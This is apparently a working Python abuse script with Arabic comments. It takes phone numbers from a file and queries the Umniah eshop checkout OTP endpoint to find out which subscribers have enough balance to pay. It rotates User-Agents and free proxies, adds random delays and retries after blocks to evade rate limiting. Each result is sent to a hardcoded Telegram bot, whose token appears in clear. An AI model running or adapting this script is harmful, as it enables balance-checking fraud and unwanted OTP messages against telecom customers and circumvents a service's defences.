import requests
import time
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

# قائمة User-Agents
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/152.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
]

# قائمة Proxies المجانية (جرب هذه أولاً)
PROXIES_LIST = [
    'http://95.216.194.71:8080',
    'http://117.121.202.34:8080',
    'http://200.24.67.98:8080',
    'http://103.145.45.97:55443',
    'http://45.132.185.75:80',
    'http://185.21.101.157:80',
    'http://104.18.55.155:80',
    'http://47.254.32.173:8080',
    'http://202.43.190.11:8080',
    'http://52.15.102.93:80',
    # أضف proxies إضافية من: https://www.proxy-list.download/
    # أو: https://free-proxy-list.com/
]

BASE_COOKIES = {
    'wp_ga4_customerGroup': 'NOT%20LOGGED%20IN',
    '_gcl_au': '1.1.1488191976.1788724682',
    '_ga': 'GA1.1.1652587676.1788724683',
    '_twpid': 'tw.1788724682629.93328193554679845',
    '_fbp': 'fb.1.1788724682843.15328305795544321',
    'user_allowed_save_cookie': '%7B%221%22%3A1%7D',
}

BASE_HEADERS = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://eshop.umniah.com',
    'referer': 'https://eshop.umniah.com/ar/vendic/index/checkotp/',
    'priority': 'u=1, i',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
}

# معلومات البوت
TELEGRAM_BOT_TOKEN = '7327256170:AAEiQ_F_BI1V9iUHzgPPui7JRwqGnj6Jys4'
TELEGRAM_CHAT_ID = '6873334348'
TELEGRAM_API = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'

# عدد الخيوط المتزامنة
NUM_THREADS = 2

# عدد المحاولات للأرقام الفاشلة
MAX_RETRIES = 3

# استخدام proxy أم لا
USE_PROXY = True

def get_random_user_agent():
    """الحصول على User-Agent عشوائي"""
    return random.choice(USER_AGENTS)

def get_random_proxy():
    """الحصول على Proxy عشوائي"""
    if not USE_PROXY:
        return None
    
    proxy = random.choice(PROXIES_LIST)
    return {
        'http': proxy,
        'https': proxy
    }

def get_headers():
    """الحصول على headers مع User-Agent عشوائي"""
    headers = BASE_HEADERS.copy()
    headers['user-agent'] = get_random_user_agent()
    return headers

def check_phone(phone_number, index, total, retry_count=0):
    """فحص رقم واحد وإرسال النتيجة للبوت"""
    try:
        # تأخير عشوائي قبل الطلب
        delay = random.uniform(2, 4)
        time.sleep(delay)
        
        json_data = {
            'phone_number': phone_number,
            'request': 'generate',
            'orderid': '727165',
        }
        
        # الحصول على headers و proxies عشوائية
        headers = get_headers()
        proxies = get_random_proxy()
        proxy_info = f" [Proxy: {list(proxies.values())[0][:30]}...]" if proxies else " [No Proxy]"
        
        response = requests.post(
            'https://eshop.umniah.com/ar/vendic/index/checkotp/', 
            cookies=BASE_COOKIES,
            headers=headers, 
            json=json_data, 
            timeout=15,
            proxies=proxies,
            allow_redirects=True
        )
        
        if response.status_code == 200:
            try:
                response_data = response.json()
            except:
                print(f"[{index}/{total}] ⚠️ {phone_number} - خطأ في قراءة JSON{proxy_info}")
                return ('json_error', phone_number, None)
            
            # التحقق من data1 == success (يوجد رصيد)
            if response_data.get('data1') == 'success':
                message = f"""
╔══════════════════════════════════╗
║  ✅ حسابك يحتوي على رصيد ✅       ║
╚══════════════════════════════════╝

📱 رقم الهاتف: {phone_number}
📦 رقم الطلب: 727165
💰 الحالة: يوجد رصيد كافي

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✨ Status: SUCCESS
📊 الرقم: {index}/{total}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
                print(f"[{index}/{total}] ✅ {phone_number} - يوجد رصيد{proxy_info}")
                return ('success', phone_number, message)
            
            # التحقق من عدم وجود رصيد
            data2_text = str(response_data.get('data2', '')).lower()
            if 'balance' in data2_text or 'رصيد' in data2_text:
                message = f"""
╔══════════════════════════════════╗
║     ❌ لا يوجد رصيد كافي ❌        ║
╚══════════════════════════════════╝

📱 رقم الهاتف: {phone_number}
📦 رقم الطلب: 727165
💰 الحالة: رصيد غير كافي

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ الرسالة: لا يوجد رصيد كافي
📊 الرقم: {index}/{total}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
                print(f"[{index}/{total}] ⚠️ {phone_number} - لا يوجد رصيد{proxy_info}")
                return ('no_balance', phone_number, message)
            else:
                print(f"[{index}/{total}] ❓ {phone_number} - رد: {response_data.get('data2', 'N/A')}{proxy_info}")
                return ('retry', phone_number, None)
        
        elif response.status_code == 403 or response.status_code == 429:
            print(f"[{index}/{total}] 🚫 {phone_number} - محظور (HTTP {response.status_code}) - محاولة {retry_count + 1}{proxy_info}")
            return ('retry', phone_number, None)
        
        else:
            print(f"[{index}/{total}] ❌ {phone_number} - HTTP {response.status_code}{proxy_info}")
            if response.status_code >= 500:
                return ('retry', phone_number, None)
            return ('http_error', phone_number, None)
    
    except requests.Timeout:
        print(f"[{index}/{total}] ⏱️ {phone_number} - timeout (محاولة {retry_count + 1})")
        return ('retry', phone_number, None)
    
    except requests.ConnectionError as e:
        print(f"[{index}/{total}] 🔌 {phone_number} - فشل الاتصال: {str(e)[:30]}")
        return ('retry', phone_number, None)
    
    except Exception as e:
        print(f"[{index}/{total}] ❌ {phone_number} - {type(e).__name__}: {str(e)[:50]}")
        return ('error', phone_number, None)

def send_to_telegram(message):
    """إرسال رسالة للبوت"""
    try:
        telegram_data = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
        }
        response = requests.post(TELEGRAM_API, json=telegram_data, timeout=5)
        return response.status_code == 200
    except Exception as e:
        print(f"❌ خطأ في إرسال البوت: {str(e)}")
        return False

def remove_from_file(phone_number):
    """حذف الرقم من الملف"""
    try:
        with open('lu1.txt', 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        new_lines = [line for line in lines if line.strip() != phone_number]
        
        with open('lu1.txt', 'w', encoding='utf-8') as f:
            f.writelines(new_lines)
        
        return True
    except Exception as e:
        print(f"⚠️ فشل حذف {phone_number}: {str(e)}")
        return False

# البرنامج الرئيسي
def main():
    try:
        with open('lu1.txt', 'r', encoding='utf-8') as f:
            phone_numbers = [line.strip() for line in f.readlines() if line.strip()]
        
        total = len(phone_numbers)
        
        if total == 0:
            print("ℹ️ لا توجد أرقام في الملف!")
            return
        
        print(f"✅ تم قراءة {total} أرقام من الملف")
        print(f"🚀 بدء الفحص بـ {NUM_THREADS} خيوط متزامنة...")
        print(f"🔄 عدد محاولات إعادة المحاولة: {MAX_RETRIES}")
        print(f"🎲 تغيير User-Agent عشوائياً: ✅")
        print(f"🌐 استخدام Proxies: {'✅' if USE_PROXY else '❌'}")
        print(f"⏳ تأخيرات عشوائية بين الطلبات: ✅\n")
        
        success_count = 0
        no_balance_count = 0
        failed_count = 0
        
        start_time = time.time()
        
        # قائمة الأرقام المتبقية للمعالجة
        remaining_phones = phone_numbers.copy()
        attempt = 0
        
        while remaining_phones and attempt <= MAX_RETRIES:
            attempt += 1
            print(f"\n{'='*60}")
            print(f"🔄 محاولة {attempt} - معالجة {len(remaining_phones)} رقم")
            print(f"{'='*60}\n")
            
            phones_to_retry = []
            
            with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
                futures = {}
                for idx, phone in enumerate(remaining_phones):
                    # حساب الفهرس من الكل
                    original_idx = phone_numbers.index(phone) + 1 if phone in phone_numbers else idx
                    future = executor.submit(check_phone, phone, original_idx, total, attempt - 1)
                    futures[future] = phone
                
                for future in as_completed(futures):
                    phone = futures[future]
                    
                    try:
                        status, phone_num, message = future.result(timeout=25)
                        
                        if status == 'success':
                            success_count += 1
                            if message:
                                send_to_telegram(message)
                            remove_from_file(phone_num)
                        
                        elif status == 'no_balance':
                            no_balance_count += 1
                            if message:
                                send_to_telegram(message)
                            remove_from_file(phone_num)
                        
                        elif status == 'retry':
                            # أضف للقائمة للمحاولة مرة أخرى
                            if phone not in phones_to_retry:
                                phones_to_retry.append(phone)
                        
                        else:
                            # الأخطاء الأخرى - احذف الرقم
                            failed_count += 1
                            remove_from_file(phone_num)
                    
                    except Exception as e:
                        failed_count += 1
                        print(f"❌ خطأ في المعالجة: {str(e)}")
                        remove_from_file(phone)
            
            # حدّث قائمة الأرقام المتبقية
            remaining_phones = phones_to_retry
            
            # انتظر قبل المحاولة التالية
            if remaining_phones and attempt < MAX_RETRIES:
                wait_time = random.uniform(8, 15)
                print(f"\n⏳ انتظار {wait_time:.1f} ثانية قبل المحاولة التالية...")
                time.sleep(wait_time)
        
        elapsed_time = time.time() - start_time
        
        # الإحصائيات
        print(f"\n{'='*60}")
        print(f"📊 النتائج النهائية:")
        print(f"{'='*60}")
        print(f"✅ يوجد رصيد: {success_count}")
        print(f"❌ لا يوجد رصيد: {no_balance_count}")
        print(f"⚠️ فشل نهائي: {failed_count}")
        print(f"📊 المجموع: {total}")
        print(f"⏱️ الوقت: {elapsed_time:.2f} ثانية")
        if elapsed_time > 0:
            print(f"🚀 السرعة: {total/elapsed_time:.1f} رقم/ثانية")
        print(f"{'='*60}\n")

    except FileNotFoundError:
        print("❌ ملف lu1.txt غير موجود في المجلد الحالي!")
    except Exception as e:
        print(f"❌ خطأ: {str(e)}")

if __name__ == "__main__":
    main()
